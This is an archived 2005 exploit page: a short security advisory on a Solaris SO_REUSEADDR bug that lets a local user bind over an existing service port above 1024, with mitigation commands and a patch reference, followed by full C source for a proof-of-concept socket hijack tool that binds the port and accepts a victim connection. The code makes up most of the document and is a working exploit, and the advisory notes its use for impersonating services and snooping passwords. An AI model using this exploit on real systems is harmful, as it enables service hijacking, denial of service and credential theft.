<html><head><title>Solaris SPARC / x86 Local Socket Hijack Exploit</title></head><pre> /*
  *****************************************************************************************************************
  $ An open security advisory #7 - SUN Solaris SO_REUSEADDR Local Socket Hijack Bug
  *****************************************************************************************************************
  1: Bug Researcher: c0ntex - c0ntexb[at]gmail.com
  2: Bug Released: July 06 2005
  3: Bug Impact Rate: Medium / Hi
  4: Bug Scope Rate: Local / Remote
  *****************************************************************************************************************
  $ This advisory and/or proof of concept code must not be used for commercial gain.
  *****************************************************************************************************************

  Sun MicroSystems
  http://www.sun.com

  Solaris has a bug in the use of SO_REUSEADDR in that the Kernel favours any socket binding operation that
  is more specific than the general &quot;*.*&quot; wildcard bind(). As such, a malicious socket can bind to an already
  bound interface if a specific IP address is used.

  This hijack can be performed against any process over 1024, including root owned services, it is not limited
  to your own user account. One can then mimic the original service and snoop usernames / passwords, files and
  data with a trojan version of software, or just cause a DOS against the legitimate service, providing the
  service is bound to a port above 1024 and uses the SO_REUSEADDR option.

  Anyway, a work around could be setting the port numbers that are valuable to the system as privileged. Using
  the following kernel parameter, you can set ports above 1024 to act as reserved so only root can bind to them.

    tcp_extra_priv_ports_add

  To view privileged ports, run the following command:

    ndd /dev/tcp tcp_extra_priv_ports

  To set ports as privileged, run the following command:

    ndd -set /dev/tcp tcp_extra_priv_ports_add 8080

  Effected: All Solaris versions.
  Not effected: Linux, OpenBSD, FreeBSD, Windows.

  SUN have released a patch for the issue which can be downloaded from sunsolve.

  Document Audience:    PUBLIC
  Document ID:    116965-08
  Title:    Obsoleted by: 116965-09 SunOS 5.8: ip/arp/tcp/udp patch
  Update Date:    Thu May 05 09:28:25 MDT 2005
  See Patch Revision History

  Patch Id: 116965-08

  Problem Description:

  5089150 Binding to a port which has already been bound may incorrectly succeed

*/

/* solsockjack.c */
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/utsname.h&gt;
#include &lt;arpa/inet.h&gt;

#define BAD             &quot;!@#$%^&amp;*()-_=+[]{};':\&quot;,/&lt;&gt;?\\|`~ abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
#define DEFHOST         &quot;localhost&quot;
#define MAX_INCONN      1
#define PORT            1241         /* Nessus */
#define SYSTEM          &quot;SunOS&quot;

#define BL              &quot;\x1B[1;34m&quot;
#define NO              &quot;\x1B[0m&quot;
#define PI              &quot;\x1B[35m&quot;
#define PU              &quot;\x1B[1;35m&quot;
#define RE              &quot;\x1B[1;31m&quot;
#define WH              &quot;\x1B[1;37m&quot;
#define YE              &quot;\x1B[1;33m&quot;

void
banner(void)
{
        fprintf(stderr, &quot;\n%s[-] %sSUN Solaris SPARC / x86 Local Socket Hijack Exploit\n&quot;, YE, NO);
        fprintf(stderr, &quot;%s[-] %sKernel issue allows a bind on an already bound socket\n&quot;, YE, NO);
        fprintf(stderr, &quot;%s[-] %sallowing a malicious user to impersonate a service that\n&quot;, YE, NO);
        fprintf(stderr, &quot;%s[-] %sis already running on a port greater than 1024, making\n&quot;, YE, NO);
        fprintf(stderr, &quot;%s[-] %sservice-in-the-middle attacks a trivial task to perform.\n&quot;, YE, NO);
        fprintf(stderr, &quot;%s[-] %sDeveloped by c0ntex || c0ntexb@gmail.com%s\n\n&quot;, YE, WH, NO);

        _exit(EXIT_SUCCESS);
}

void
usage(int argc, char **argv)
{
        fprintf(stderr, &quot;%s[-] %s Usage:\n&quot;, YE, NO);
        fprintf(stderr, &quot;%s[-] %s\t -h \t\tIP address to bind socket to\n&quot;, YE, NO);
        fprintf(stderr, &quot;%s[-] %s\t -p \t\tport number to attempt hijack of\n&quot;, YE, NO);
        fprintf(stderr, &quot;%s[-] %s\t -v \t\tPrints this help\n&quot;, YE, NO);

        fprintf(stderr, &quot;%s[-] %s%s -h 10.1.1.215 -p 1241\n\n&quot;, YE, NO, argv[0]);

        _exit(EXIT_FAILURE);
}

void
checkerr(char *isvuln)
{
        free(isvuln);
        puts(&quot;Not today!&quot;);
        _exit(EXIT_FAILURE);
}

void
jackerr(char *vulnerable)
{
        free(vulnerable);
        _exit(EXIT_FAILURE);
}

char
*checksys(char *isvuln)
{
        struct utsname name;

        if(uname(&amp;name) &lt; 0) {
                puts(&quot;uname failed&quot;);
        }

        isvuln = malloc(6);
        if(!isvuln) {
                perror(&quot;malloc&quot;);
                _exit(EXIT_FAILURE);
        }

        if((name.sysname == NULL) || (strlen(name.sysname) &lt; 1) || (strlen(name.sysname) &gt; 5)) {
                checkerr(isvuln);
        }

        memcpy(isvuln, name.sysname, strlen(name.sysname));
        if(!isvuln) {
                checkerr(isvuln);
        }

        return(isvuln);
}

int
main(int argc, char **argv)
{
        int inbuf, jacksock, opts, solvuln;
        int port = PORT;

        char *vulnerable = NULL;
        char *systype = NULL;
        char *isvuln = NULL;
        char *bad = NULL;

        struct sockaddr_in solaris, victims;

        if(argc &lt; 2) {
                banner();
                _exit(EXIT_FAILURE);
        }

        if((systype = checksys(isvuln)) == NULL) {
                puts(&quot;Something messed up!&quot;);
                checkerr(isvuln);
        }

        if(strcmp(SYSTEM, systype) != 0) {
                puts(&quot;System is not supported - SunOS only!&quot;);
                checkerr(isvuln);
        }

        fprintf(stderr, &quot;\n%s-&gt; %sOK, potential vulnerable %s[%s] %ssystem, continuing..\n&quot;, WH, NO, BL, systype, NO);

        free(isvuln); sleep(2);

        while((opts = getopt(argc, argv, &quot;h:p:v&quot;)) != -1) {
                switch(opts)
                        {
                        case 'h':
                                bad = BAD;
                                vulnerable = malloc(16);
                                if(!vulnerable) {
                                        perror(&quot;malloc&quot;);
                                        _exit(EXIT_FAILURE);
                                }

                                if((optarg == NULL) || (strlen(optarg) &lt; 7) || (strlen(optarg) &gt; 15) || strpbrk(bad, optarg)) {
                                        puts(&quot;\n[-] Failed: IP address just isn't right!\n&quot;);
                                        jackerr(vulnerable);
                                }

                                memcpy(vulnerable, optarg, strlen(optarg));
                                if(!vulnerable) {
                                        jackerr(vulnerable);
                                }
                                break;
                        case 'p':
                                port = atoi(optarg);
                                if((port &lt; 1024) || (port &gt; 65535)) {
                                        puts(&quot;\n[-] Failed: Port number just isn't right!\n&quot;);
                                        usage(argc, argv);
                                        _exit(EXIT_FAILURE);
                                }
                                break;
                        case 'v':
                                usage(argc, argv);
                                break;
                        default:
                                usage(argc, argv);
                                break;
                        }
        }

        if(vulnerable == NULL) {
                jackerr(vulnerable);
        }

        fprintf(stderr, &quot;%s-&gt; %sJacking port %s[%d] %sat address %s[%s]%s\n&quot;, WH, NO, PI, port, NO, PU, vulnerable, NO);

        jacksock = socket(AF_INET, SOCK_STREAM, 0);
        if(jacksock &lt; 0) {
                perror(&quot;socket&quot;);
                jackerr(vulnerable);
        } sleep(2);

        if(setsockopt(jacksock, SOL_SOCKET, SO_REUSEADDR, &amp;solvuln, sizeof(int)) &lt; 0) {
                perror(&quot;setsockopt&quot;);
        }

        solaris.sin_family = AF_INET;
        solaris.sin_port = htons(port);
        solaris.sin_addr.s_addr = inet_addr(vulnerable);
        memset(&amp;solaris.sin_zero, '\0', sizeof(solaris.sin_zero));

        if(bind(jacksock, (struct sockaddr *)&amp;solaris, sizeof(struct sockaddr)) &lt; 0) {
                perror(&quot;bind&quot;);
                fprintf(stderr, &quot;[-] %sFailed: %sCould not snag port, must be patched!\n&quot;, RE, NO);
                jackerr(vulnerable);
        }

        fprintf(stderr, &quot;%s-&gt; %s%sSuccess!! %sPort %s[%d] %shas been hijacked!\n%s-&gt; %sWait...\n&quot;, WH, NO, YE, NO, PI, port, NO, WH, NO);

        if(listen(jacksock, MAX_INCONN) &lt; 0) {
                perror(&quot;listen&quot;);
                puts(&quot;[-] Failed: Could not listen for an incoming connection!&quot;);
                jackerr(vulnerable);
        } sleep(2);

        fprintf(stderr, &quot;%s-&gt; %sOK, listening for incoming connections to compromise&quot;, WH, NO);

        inbuf = sizeof(victims);

        if(accept(jacksock, (struct sockaddr *)&amp;victims, &amp;inbuf) &lt; 0) {
                perror(&quot;accept&quot;);
                puts(&quot;[-] Failed: Could not accept the incoming connection!&quot;);
                jackerr(vulnerable);
        }

        fprintf(stderr, &quot;\n%s-&gt; %sSnagged a victim connecting from %s[%s]%s\n&quot;, WH, NO, YE, inet_ntoa(victims.sin_addr), NO);

        sleep(1);

        close(jacksock);

        puts(&quot;-&gt; Victim has been released to live another day!&quot;);

        sleep(1);

        puts(&quot;-&gt; Test was a success!&quot;);

        free(vulnerable);

        return(0);
}

// milw0rm.com [2005-07-06]</pre></html>